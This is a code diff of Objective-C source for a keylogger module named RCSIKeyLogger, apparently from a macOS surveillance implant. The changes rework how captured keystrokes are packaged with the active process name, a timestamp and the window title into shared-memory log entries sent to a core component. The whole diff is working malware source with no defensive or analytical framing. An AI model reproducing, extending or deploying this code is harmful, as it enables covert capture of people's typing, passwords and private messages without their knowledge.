@@ -13,13 +13,14 @@
 
 //#define DEBUG
 
-static int gContextHasBeenSwitched = 0;
 static NSString *gWindowTitle      = nil;
 static NSLock   *gKeylogLock       = nil;
 u_int gPrevStringLen               = 0;
 
 
 @implementation RCSIKeyLogger
+
+@synthesize mContextHasBeenSwitched;
 
 - (id)init
 {
@@ -28,6 +29,7 @@ u_int gPrevStringLen               = 0;
   if (self != nil)
     {
       gKeylogLock = [[NSLock alloc] init];
+      mContextHasBeenSwitched = TRUE;
       return self;
     }
 }
@@ -92,86 +94,89 @@ u_int gPrevStringLen               = 0;
           NSMutableData *entryData = [[NSMutableData alloc] init];
           
           shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+          shMemoryHeader->flag  = 0;
           short unicodeNullTerminator = 0x0000;
-          
-          if (gContextHasBeenSwitched < 2)
+        
+#define CONTEXT_MANDATORY 0xFFFF0000;
+
+          if (mContextHasBeenSwitched == TRUE)
             {
-              gContextHasBeenSwitched++;
+              mContextHasBeenSwitched = FALSE;
+              shMemoryHeader->flag  = CONTEXT_MANDATORY;
+            }
+
+          NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+          NSString *_processName      = [[processInfo processName] copy];
+          
+          time_t rawtime;
+          struct tm *tmTemp;
+          
+          processName  = [[NSMutableData alloc] initWithData:
+                          [_processName dataUsingEncoding:
+                          NSUTF16LittleEndianStringEncoding]];
+          
+          // Dummy word
+          short dummyWord = 0x0000;
+          [entryData appendBytes: &dummyWord
+                          length: sizeof(short)];
+          
+          // Struct tm
+          time (&rawtime);
+          tmTemp = gmtime(&rawtime);
+          tmTemp->tm_year += 1900;
+          tmTemp->tm_mon  ++;
+          
+          //
+          // Our struct is 0x8 bytes bigger than the one declared on win32
+          // this is just a quick fix
+          //
+          [entryData appendBytes: (const void *)tmTemp
+                          length: sizeof (struct tm) - 0x8];
+          
+          // Process Name
+          [entryData appendData: processName];
+          // Null terminator
+          [entryData appendBytes: &unicodeNullTerminator
+                          length: sizeof(short)];
+          
+          //_windowName = [self title];
+          //_windowName = @"EMPTY";
+          
+          [gKeylogLock lock];
+          
+          if ([gWindowTitle isEqualToString: @""]
+              || gWindowTitle == nil)
+            {
+              windowName = [[NSMutableData alloc] initWithData:
+                            [@"EMPTY" dataUsingEncoding:
+                             NSUTF16LittleEndianStringEncoding]];
+            }
+          else
+            {
+              windowName = [[NSMutableData alloc] initWithData:
+                            [gWindowTitle dataUsingEncoding:
+                             NSUTF16LittleEndianStringEncoding]];
             }
           
-          if (gContextHasBeenSwitched == 1)
-            {
-              //gContextHasBeenSwitched = FALSE;
-              NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
-              NSString *_processName      = [[processInfo processName] copy];
-              
-              time_t rawtime;
-              struct tm *tmTemp;
-              
-              processName  = [[NSMutableData alloc] initWithData:
-                              [_processName dataUsingEncoding:
-                              NSUTF16LittleEndianStringEncoding]];
-              
-              // Dummy word
-              short dummyWord = 0x0000;
-              [entryData appendBytes: &dummyWord
-                              length: sizeof(short)];
-              
-              // Struct tm
-              time (&rawtime);
-              tmTemp = gmtime(&rawtime);
-              tmTemp->tm_year += 1900;
-              tmTemp->tm_mon  ++;
-              
-              //
-              // Our struct is 0x8 bytes bigger than the one declared on win32
-              // this is just a quick fix
-              //
-              [entryData appendBytes: (const void *)tmTemp
-                              length: sizeof (struct tm) - 0x8];
-              
-              // Process Name
-              [entryData appendData: processName];
-              // Null terminator
-              [entryData appendBytes: &unicodeNullTerminator
-                              length: sizeof(short)];
-              
-              //_windowName = [self title];
-              //_windowName = @"EMPTY";
-              
-              [gKeylogLock lock];
-              
-              if ([gWindowTitle isEqualToString: @""]
-                  || gWindowTitle == nil)
-                {
-                  windowName = [[NSMutableData alloc] initWithData:
-                                [@"EMPTY" dataUsingEncoding:
-                                 NSUTF16LittleEndianStringEncoding]];
-                }
-              else
-                {
-                  windowName = [[NSMutableData alloc] initWithData:
-                                [gWindowTitle dataUsingEncoding:
-                                 NSUTF16LittleEndianStringEncoding]];
-                }
-              
-              [gKeylogLock unlock];
-              
-              // Window Name
-              [entryData appendData: windowName];
-              // Null terminator
-              [entryData appendBytes: &unicodeNullTerminator
-                              length: sizeof(short)];
-              
-              // Delimeter
-              unsigned long del = DELIMETER;
-              [entryData appendBytes: &del
-                              length: sizeof(del)];
-              
-              [processName release];
-              [_processName release];
-              [windowName release];
-            }
+          [gKeylogLock unlock];
+          
+          // Window Name
+          [entryData appendData: windowName];
+          // Null terminator
+          [entryData appendBytes: &unicodeNullTerminator
+                          length: sizeof(short)];
+          
+          // Delimeter
+          unsigned long del = DELIMETER;
+          [entryData appendBytes: &del
+                          length: sizeof(del)];
+                          
+          shMemoryHeader->flag  |= ([entryData length] & 0x0000FFFF);
+          
+          [processName release];
+          [_processName release];
+          [windowName release];
+
         
           contentData = [[NSMutableData alloc] initWithData:
                          [mBufferString dataUsingEncoding:
@@ -184,11 +189,11 @@ u_int gPrevStringLen               = 0;
           
           shMemoryHeader->status          = SHMEM_WRITTEN;
           shMemoryHeader->logID           = 0;
-          shMemoryHeader->agentID         = AGENT_KEYLOG;
+          shMemoryHeader->agentID         = LOG_KEYLOG;
           shMemoryHeader->direction       = D_TO_CORE;
           shMemoryHeader->commandType     = CM_LOG_DATA;
           shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
-          shMemoryHeader->flag            = 0;
+          
           shMemoryHeader->commandDataSize = [entryData length];
           
           memcpy(shMemoryHeader->commandData,
